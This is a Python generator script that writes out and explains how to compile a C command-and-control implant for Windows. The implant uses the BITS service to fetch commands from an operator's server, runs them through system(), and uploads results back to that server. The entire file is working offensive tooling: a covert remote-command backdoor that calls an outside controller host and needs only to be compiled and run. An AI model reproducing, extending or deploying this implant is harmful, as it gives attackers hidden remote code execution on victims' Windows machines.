import os

def generate_implant(ip_address, port, output_file):
    """
    Generate a C implant that uses BITS to communicate with the specified server IP and port.
    """
    command_url = f"http://{ip_address}/commands/command.json"
    upload_url = f"http://{ip_address}/uploads/response.txt"
    local_command_file = "C:\\\\Windows\\\\Temp\\\\command.json"
    local_result_file = "C:\\\\Windows\\\\Temp\\\\response.txt"

    c_code = f"""
#include <windows.h>
#include <bits.h>
#include <stdio.h>
#include <comdef.h>

#pragma comment(lib, "bits.lib")
#pragma comment(lib, "ole32.lib")

#define COMMAND_URL L"{command_url}"
#define UPLOAD_URL L"{upload_url}"
#define LOCAL_COMMAND_FILE L"{local_command_file}"
#define LOCAL_RESULT_FILE L"{local_result_file}"

// Function to initialize COM
HRESULT InitializeCOM() {{
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {{
        printf("[-] Failed to initialize COM. Error: 0x%08lx\\n", hr);
    }}
    return hr;
}}

// Function to create a BITS manager
HRESULT CreateBITSManager(IBackgroundCopyManager **pManager) {{
    HRESULT hr = CoCreateInstance(__uuidof(BackgroundCopyManager), NULL, CLSCTX_LOCAL_SERVER, __uuidof(IBackgroundCopyManager), (void**)pManager);
    if (FAILED(hr)) {{
        printf("[-] Failed to create BITS manager. Error: 0x%08lx\\n", hr);
    }}
    return hr;
}}

// Function to download a file using BITS
HRESULT DownloadFile(IBackgroundCopyManager *pManager, LPCWSTR remoteUrl, LPCWSTR localPath) {{
    IBackgroundCopyJob *pJob = NULL;
    GUID jobId;
    HRESULT hr = pManager->CreateJob(L"DownloadJob", BG_JOB_TYPE_DOWNLOAD, &jobId, &pJob);

    if (SUCCEEDED(hr)) {{
        hr = pJob->AddFile(remoteUrl, localPath);
        if (SUCCEEDED(hr)) {{
            hr = pJob->Resume();
            if (SUCCEEDED(hr)) {{
                printf("[*] Downloading file...\\n");
                BG_JOB_STATE state;
                do {{
                    Sleep(1000);
                    pJob->GetState(&state);
                }} while (state == BG_JOB_STATE_TRANSFERRING);

                if (state == BG_JOB_STATE_TRANSFERRED) {{
                    pJob->Complete();
                    printf("[+] File downloaded successfully to: %ls\\n", localPath);
                }} else {{
                    printf("[-] Download failed.\\n");
                }}
            }}
        }}
        pJob->Release();
    }}
    return hr;
}}

// Function to upload a file using BITS
HRESULT UploadFile(IBackgroundCopyManager *pManager, LPCWSTR remoteUrl, LPCWSTR localPath) {{
    IBackgroundCopyJob *pJob = NULL;
    GUID jobId;
    HRESULT hr = pManager->CreateJob(L"UploadJob", BG_JOB_TYPE_UPLOAD, &jobId, &pJob);

    if (SUCCEEDED(hr)) {{
        hr = pJob->AddFile(localPath, remoteUrl);
        if (SUCCEEDED(hr)) {{
            hr = pJob->Resume();
            if (SUCCEEDED(hr)) {{
                printf("[*] Uploading file...\\n");
                BG_JOB_STATE state;
                do {{
                    Sleep(1000);
                    pJob->GetState(&state);
                }} while (state == BG_JOB_STATE_TRANSFERRING);

                if (state == BG_JOB_STATE_TRANSFERRED) {{
                    pJob->Complete();
                    printf("[+] File uploaded successfully from: %ls\\n", localPath);
                }} else {{
                    printf("[-] Upload failed.\\n");
                }}
            }}
        }}
        pJob->Release();
    }}
    return hr;
}}

int main() {{
    HRESULT hr;
    IBackgroundCopyManager *pManager = NULL;

    printf("[*] Starting BITS-based C2 Implant...\\n");

    // Initialize COM and BITS
    hr = InitializeCOM();
    if (FAILED(hr)) return 1;

    hr = CreateBITSManager(&pManager);
    if (FAILED(hr)) return 1;

    // Download the command file
    hr = DownloadFile(pManager, COMMAND_URL, LOCAL_COMMAND_FILE);
    if (FAILED(hr)) {{
        printf("[-] Failed to download command file.\\n");
    }} else {{
        // Execute the command
        FILE *fp = fopen(LOCAL_COMMAND_FILE, "r");
        if (fp) {{
            char command[512];
            if (fgets(command, sizeof(command), fp)) {{
                printf("[*] Executing command: %s\\n", command);
                system(command);

                // Save the result
                FILE *result = fopen(LOCAL_RESULT_FILE, "w");
                if (result) {{
                    fprintf(result, "Command executed: %s\\n", command);
                    fclose(result);
                }}
            }}
            fclose(fp);
        }}

        // Upload the result file
        hr = UploadFile(pManager, UPLOAD_URL, LOCAL_RESULT_FILE);
        if (FAILED(hr)) {{
            printf("[-] Failed to upload result file.\\n");
        }}
    }}

    // Clean up
    if (pManager) pManager->Release();
    CoUninitialize();
    return 0;
}}
    """

    # Write the C code to the specified file
    with open(output_file, "w") as f:
        f.write(c_code)

    print(f"[+] BITS-based C implant generated and saved to '{output_file}'.")

if __name__ == "__main__":
    print("===== BITS-Based C Implant Generator =====")
    ip = input("Enter the IP address of the server: ")
    port = input("Enter the port (not needed for BITS but kept for extension): ")

    output_path = "bits_implant.c"
    generate_implant(ip, port, output_path)

    print(f"[!] Run the following command to compile the C implant:\n")
    print(f"    x86_64-w64-mingw32-gcc -o bits_implant.exe bits_implant.c -lOle32 -lBits\n")
    print("[!] Use the generated 'bits_implant.exe' to test the BITS communication.")
